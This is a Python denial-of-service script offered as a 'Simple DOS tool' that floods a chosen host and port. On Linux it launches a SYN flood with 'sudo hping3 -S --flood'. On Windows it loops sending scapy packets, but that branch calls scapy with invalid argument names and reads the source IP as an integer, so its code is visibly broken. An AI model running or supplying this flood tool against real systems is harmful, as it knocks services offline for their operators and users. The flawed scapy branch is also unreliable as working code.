try:
    import subprocess
    import argparse
    import sys
    import os
    from scapy.all import *
except Exception as module:
    print("some modules are not installed\n", module)
parser = argparse.ArgumentParser(description="Simple DOS tool created by Manash")
parser.add_argument('-i', '--host', type=str, help='Target a IP address')
parser.add_argument('-p', '--port', type=int, help='Spacify the port number')
if sys.platform.startswith('win'):
    os.system("cls")
    parser.add_argument('-s', '--source', type=int, required=True, help='Describe the IP of source [Required only windows platform]')
else:
    os.system("clear")
    parser.add_argument('-s', '--source', type=int, required=False, help='Describe the IP of source [Required only windows platform]')
arg = parser.parse_args()
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()
if sys.platform.startswith('win'):
    def attack(host, port, source):    
        i = 1 
        source_IP = source
        target_IP = host
        source_port = port
        try:
            while True:
                IP1 = IP(source_IP = source_IP, destination = target_IP)
                TCP1 = TCP(srcport = source_port, dstport = 80)
                pkt = IP1 / TCP1
                send(pkt, inter = .001)
                print ("packet sent ", i)
                i = i + 1
        except Exception as modules:
            with open('C:\\Users\\dos_log.txt', 'w') as log:
                log.write(f'Not supported module is {modules} , Please installed it first then try again')
                pass
            print("Some module not found")
            quit()
    if __name__ == '__main__':
        attack(arg.host, arg.port, arg.source)
else:
    def hping(host, port):
        exist = subprocess.call(['which', 'hping3'])
        if exist == 0:
            os.system(f"sudo hping3 -S --flood -V -p {port} {host}")
        else:
            print("I think hping3 is not installed in your device")
    if __name__ == '__main__':
        hping(arg.host, arg.port)
